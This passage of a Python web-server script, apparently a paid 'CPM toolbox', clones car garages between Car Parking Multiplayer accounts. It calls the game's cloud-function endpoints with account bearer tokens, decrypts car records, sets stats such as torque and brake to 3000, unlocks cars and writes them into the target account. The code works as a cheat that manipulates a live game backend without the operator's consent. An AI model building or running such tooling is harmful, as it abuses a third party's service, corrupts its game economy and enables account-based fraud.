                        return [c for c in _v if isinstance(c, dict) and int(c.get('CarID') or 0) > 0]
                except Exception:
                    pass
                return None

            _dst_uid8 = (dst.uid or '')[:8].upper()
            _dst_lids = str(dst.record.get('localID') or '') or (dst.uid or '')[:8]
            _max_fix = 6
            _no_prog = 0
            _last_missing = None
            _fix_total = 0
            for _fx in range(1, _max_fix + 1):
                _src_cars = _SRC_CARS_CACHE[0]
                if not _src_cars:
                    _src_cars = _pull_cars(src.token)
                    if _src_cars:
                        _SRC_CARS_CACHE[0] = _src_cars
                _dst_cars = _pull_cars(dst.token)
                if _src_cars is None or _dst_cars is None:
                    _clone_job_update(jid, message='补克隆第%d轮：读取车库失败，跳过' % _fx)
                    break
                _src_ids = sorted(set(int(c.get('CarID') or 0) for c in _src_cars))
                _dst_ids = set(int(c.get('CarID') or 0) for c in _dst_cars)
                _missing = [x for x in _src_ids if x not in _dst_ids]
                if not _missing:
                    _clone_job_update(jid, message='补克隆第%d轮：无缺口 ✓（源 %d 车型 / 目标 %d 车型）' % (_fx, len(_src_ids), len(_dst_ids)))
                    break
                _clone_job_update(jid, message='补克隆第%d轮：缺 %d 个车型，开始补…' % (_fx, len(_missing)))
                _src_by_id = {}
                for _c in _src_cars:
                    _src_by_id.setdefault(int(_c.get('CarID') or 0), _c)
                _this_ok = 0
                for _ci, _cid3 in enumerate(_missing):
                    _sc0 = _src_by_id.get(_cid3)
                    if _sc0 is None:
                        continue
                    try:
                        _nc = json.loads(json.dumps(_sc0, ensure_ascii=False))
                        _nc['engineID'] = 5
                        _nc['cdi'] = True
                        _nc['isLocked'] = False
                        _nc['torque'] = 3000.0
                        _nc['brake'] = 3000.0
                        _nc['mass'] = 1100.0
                        # PATCH32：恢复 v3-clone7 原样——补克隆走 _transcode_car 解密
                        try:
                            _nc, _tst = _transcode_car(_nc, src.uid or '')
                        except Exception:
                            pass
                        _inst3 = '%s_%d_HZ' % (_dst_uid8, _cid3)
                        _tx3 = _nc.get('texts')
                        if isinstance(_tx3, list) and len(_tx3) > 2:
                            _tx3[2] = _inst3
                        else:
                            _nc['texts'] = ['', '', _inst3]
                        if isinstance(_nc.get('Vynils'), dict):
                            _nc['Vynils']['CarID'] = _cid3
                        # 找槽：优先 carID 匹配的
                        _slot3 = None
                        try:
                            _sr3 = http_post(_ws_url3, {'data': 20}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=25)
                            _sv3 = _sr3.get('result') if isinstance(_sr3, dict) else None
                            for _u in range(2):
                                if isinstance(_sv3, str):
                                    try:
                                        _sv3 = json.loads(_sv3)
                                    except Exception:
                                        break
                            if isinstance(_sv3, list):
                                for _sl3 in _sv3:
                                    if isinstance(_sl3, dict) and int(_sl3.get('carID') or 0) == _cid3:
                                        _slot3 = _sl3
                                        break
                                if _slot3 is None:
                                    for _sl3 in _sv3:
                                        if isinstance(_sl3, dict) and int(_sl3.get('carID') or 0) == 0:
                                            _slot3 = _sl3
                                            break
                                if _slot3 is None and _sv3:
                                    _slot3 = _sv3[0]
                        except Exception:
                            _slot3 = None
                        if not isinstance(_slot3, dict):
                            continue
                        _pay3 = {
                            'ownerID': _slot3.get('ownerID', ''),
                            'ownerName': _slot3.get('ownerName', ''),
                            'description': _slot3.get('description', ''),
                            'CarID': _slot3.get('carID', 0),
                            'carGeneratedID': _slot3.get('carGeneratedID', ''),
                            'ownerAccountID': _slot3.get('ownerAccountID', ''),
                            'oneCar': _nc,
                            'vynilOneCar': _nc.get('Vynils', {}),
                            'loadedLocalCar': {'instanceID': -100000 - _cid3},
                            'price': _slot3.get('price', 100),
                            'SellingCar': {},
                            'willReject': False,
                            'dislike': 1,
                            'like': 0,
                            'liked': False,
                            'disliked': False,
                            'mode': 1,
                        }
                        _pr3 = http_post(_wp_url3, {'data': json.dumps(_pay3, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=40)
                        _prv3 = _pr3.get('result') if isinstance(_pr3, dict) else None
                        if str(_prv3) in ('1', '2', '6', '14'):
                            _this_ok += 1
                    except Exception:
                        pass
                    _clone_job_update(jid, message='补克隆第%d轮 %d/%d：车型 %d' % (_fx, _ci + 1, len(_missing), _cid3))
                    try:
                        time.sleep(0.4)
                    except Exception:
                        pass
                # 轮末对账
                _dst_cars2 = _pull_cars(dst.token)
                if _dst_cars2 is None:
                    break
                _dst_ids2 = set(int(c.get('CarID') or 0) for c in _dst_cars2)
                _still = [x for x in _src_ids if x not in _dst_ids2]
                _fix_total += (len(_missing) - len(_still))
                _clone_job_update(jid, message='补克隆第%d轮完成：补上 %d，仍缺 %d' % (_fx, len(_missing) - len(_still), len(_still)))
                if not _still:
                    break
                if _last_missing is not None and len(_still) >= len(_last_missing):
                    _no_prog += 1
                    if _no_prog >= 2:
                        _clone_job_update(jid, message='补克隆：连续两轮无进展，停止（仍缺 %d）' % len(_still))
                        break
                else:
                    _no_prog = 0
                _last_missing = _still
                try:
                    time.sleep(1.2)
                except Exception:
                    pass
                # 补齐外观（把缺车的源外观推过去）
                try:
                    _need_map = {}
                    for _c in (_dst_cars2 or []):
                        _need_map.setdefault(int(_c.get('CarID') or 0), []).append(_c)
                    for _cid4 in _still[:20]:
                        _sc4 = _src_by_id.get(_cid4)
                        _dc4 = (_need_map.get(_cid4) or [None])[0]
                        if not isinstance(_sc4, dict) or not isinstance(_dc4, dict):
                            continue
                        _m4 = json.loads(json.dumps(_dc4, ensure_ascii=False))
                        _chg = False
                        # PATCH29：恢复 v3-clone7 原样——直接搬源车字段
                        for _fk4 in ('floats', 'vectors', 'gears', 'typeToInstall', 'BoughtParts', 'Vynils', 'WindowVinyls', 'fsoData', 'installedPoliceLights'):
                            if _fk4 in _sc4 and _sc4.get(_fk4) is not None:
                                if json.dumps(_m4.get(_fk4), ensure_ascii=False, sort_keys=True) != json.dumps(_sc4.get(_fk4), ensure_ascii=False, sort_keys=True):
                                    _m4[_fk4] = _sc4.get(_fk4)
                                    _chg = True
                        if _chg:
                            try:
                                http_post(_sv_url3, {'data': json.dumps(_m4, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=25)
                            except Exception:
                                pass
                            try:
                                time.sleep(0.2)
                            except Exception:
                                pass
                    _clone_job_update(jid, message='补克隆第%d轮：外观补齐 %d 辆' % (_fx, min(len(_still), 20)))
                except Exception:
                    pass
            seg_rows.append(['补克隆', True, _fix_total, '共补 %d 辆' % _fix_total])
        except Exception as _ce3:
            _clone_job_update(jid, message='补克隆异常：%s' % str(_ce3)[:120])

        # ===== 第 11 阶段：全量外观同步（PATCH34）=====
        # 病根：原「外观同步」在第 9 阶段跑，那时目标号只有少量车；
        # 补克隆（第 10 阶段）之后进来的车完全没同步外观 → 只有空壳。
        # 这里在补克隆收尾后，对目标号【全部车辆】再同步一次外观。
        try:
            _clone_job_update(jid, phase='外观补同步', message='外观补同步：读取两边车库…')
            _as_src = None
            try:
                _as_src = _pull_cars(src.token)
            except Exception:
                _as_src = None
            if _as_src is None:
                _r11 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None},
                                 headers={'Authorization': 'Bearer ' + (src.token or '')}, timeout=60)
                _v11 = _r11.get('result') if isinstance(_r11, dict) else None
                for _u in range(2):
                    if isinstance(_v11, str):
                        try:
                            _v11 = json.loads(_v11)
                        except Exception:
                            break
                _as_src = [c for c in _v11 if isinstance(c, dict) and int(c.get('CarID') or 0) > 0] if isinstance(_v11, list) else []
            _r12 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None},
                             headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=60)
            _v12 = _r12.get('result') if isinstance(_r12, dict) else None
            for _u in range(2):
                if isinstance(_v12, str):
                    try:
                        _v12 = json.loads(_v12)
                    except Exception:
                        break
            _as_dst = [c for c in _v12 if isinstance(c, dict) and int(c.get('CarID') or 0) > 0] if isinstance(_v12, list) else []

            # 源车按 CarID 建索引，并把每台的「解密后明文」预计算好
            _as_map = {}
            for _c in (_as_src or []):
                _as_map.setdefault(int(_c.get('CarID') or 0), _c)
            _as_plain = {}
            for _cidp, _s0 in _as_map.items():
                try:
                    _p0, _st0 = _transcode_car(json.loads(json.dumps(_s0, ensure_ascii=False)), src.uid or '')
                    _as_plain[_cidp] = (_p0, _st0)
                except Exception:
                    _as_plain[_cidp] = (None, {})

            _as_ok = 0
            _as_fail = 0
            _as_flds = ['floats', 'vectors', 'gears', 'typeToInstall', 'BoughtParts', 'Vynils', 'WindowVinyls', 'fsoData', 'installedPoliceLights', 'dataVersion']
            for _dc11 in _as_dst:
                _cid11 = int(_dc11.get('CarID') or 0)
                _pl11 = _as_plain.get(_cid11)
                if not _pl11 or not _pl11[0]:
                    continue
                _sp11, _ok11 = _pl11
                _m11 = json.loads(json.dumps(_dc11, ensure_ascii=False))
                _chg11 = False
                for _fk11 in _as_flds:
                    if _fk11 not in _ok11:
                        continue
                    _nv11 = _sp11.get(_fk11)
                    if _nv11 is None:
                        continue
                    if _fk11 == 'Vynils' and isinstance(_nv11, dict):
                        _nv11 = json.loads(json.dumps(_nv11, ensure_ascii=False))
                        _nv11['CarID'] = _cid11
                    if json.dumps(_m11.get(_fk11), ensure_ascii=False, sort_keys=True) != json.dumps(_nv11, ensure_ascii=False, sort_keys=True):
                        _m11[_fk11] = _nv11
                        _chg11 = True
                if not _chg11:
                    _as_ok += 1
                    continue
                try:
                    _wr11 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8',
                                      {'data': json.dumps(_m11, ensure_ascii=False)},
                                      headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=30)
                    _wv11 = _wr11.get('result') if isinstance(_wr11, dict) else None
                    if str(_wv11) == '1':
                        _as_ok += 1
                    else:
                        _as_fail += 1
                except Exception:
                    _as_fail += 1
                try:
                    time.sleep(0.22)
                except Exception:
                    pass
            _clone_job_update(jid, message='外观补同步完成：成功 %d / 失败 %d（共 %d 辆）' % (_as_ok, _as_fail, len(_as_dst)))
            seg_rows.append(['外观补同步', _as_ok > 0, _as_ok, '成功%d/失败%d' % (_as_ok, _as_fail)])
        except Exception as _ce4:
            _clone_job_update(jid, message='外观补同步异常：%s' % str(_ce4)[:120])

        verify = {}
        try:
            if dst.load():
                _c2 = dst.record.get('carIDnStatus') or {}
                _g2 = (_c2.get('carGeneratedIDs') or []) if isinstance(_c2, dict) else []
                verify['dstCars'] = len([x for x in _g2 if str(x)])
                verify['srcCars'] = vn_src
                verify['dstMoney'] = int(dst.record.get('money') or 0)
                verify['dstCoin'] = int(dst.record.get('coin') or 0)
        except Exception:
            pass
        _clone_job_update(jid, finished=True,
                          result={'ok': ok_n > 0, 'dstName': dst.record.get('Name') or '',
                                  'dstId': dst.record.get('localID') or '',
                                  'segs': seg_rows, 'okCount': ok_n, 'total': len(SEGS), 'verify': verify})
    except Exception as e:
        _clone_job_update(jid, finished=True, error='克隆异常：%s' % e)


# ------------------------------------------------------------
# 启动
# ------------------------------------------------------------

def main():
    port = 8787
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except Exception:
            pass
    # 云平台（如 Render/Replit）通过环境变量指定端口
    if os.environ.get('PORT'):
        try:
            port = int(os.environ['PORT'])
        except Exception:
            pass
    try:
        _cfg_load()
    except Exception as _e0:
        print('[cfg] 初始化失败: %r' % _e0)
    status = engine_status()
    try:
        _visits_load()
    except Exception as _ev0:
        print('[visits] 初始化失败: %r' % _ev0)
    try:
        _notice_load()
    except Exception as _en0:
        print('[notice] 初始化失败: %r' % _en0)
    print('=' * 52)
    print(' CPM 工具箱 · 服务端已启动')
    print(' Brotli 引擎: %s' % status)
    print(' 密钥系统: 已加载 %d 个密钥' % len(_KEYS['keys']))
    print(' 管理口令: %s' % ('(来自环境变量 ADMIN_PASS)' if os.environ.get('ADMIN_PASS') else ADMIN_PASS))
    if status == 'none':
        print(' ！！警告：Brotli 引擎不可用，读档/写档会失败。')
        print('    请任选其一：')
        print('      pip3 install brotli --break-system-packages')
        print('      或安装 node（内置 brotli）')
    print(' 打开浏览器访问:  http://127.0.0.1:%d' % port)
    print(' （同一 Wi-Fi 下其他设备可用本机 IP:%d 访问）' % port)
    print('=' * 52)
    srv = ThreadingHTTPServer(('0.0.0.0', port), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()